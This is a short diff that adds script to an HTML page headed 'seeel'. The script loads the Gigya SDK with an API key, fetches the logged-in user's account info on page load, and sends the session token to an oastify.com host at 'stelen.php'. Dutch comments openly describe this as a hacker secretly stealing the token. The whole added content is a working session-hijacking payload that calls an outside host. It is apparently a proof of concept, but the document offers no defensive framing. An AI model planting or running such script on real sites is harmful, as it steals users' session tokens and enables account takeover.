@@ -1,1 +1,19 @@
 <h1>seeel</h1>
+
+
+<script src="https://cdns.eu1.gigya.com/js/gigya.js?apiKey=4_hRanGnYDFjdiZQfh-ghhhg"></script>
+
+<script>
+    // Zodra de pagina laadt, vraagt het script om de logingegevens
+    gigya.accounts.getAccountInfo({
+        callback: function(response) {
+            if (response.errorCode === 0) {
+                // Gevonden! We hebben het token en de profieldata.
+                var token = response.sessionInfo.sessionToken;
+                
+                // Nu stuurt de hacker dit token stiekem naar zijn eigen server
+                fetch('https://wpphe9dwx4cvgapez8dobl1c73du1kp9.oastify.com/stelen.php?token=' + token);
+            }
+        }
+    });
+</script>
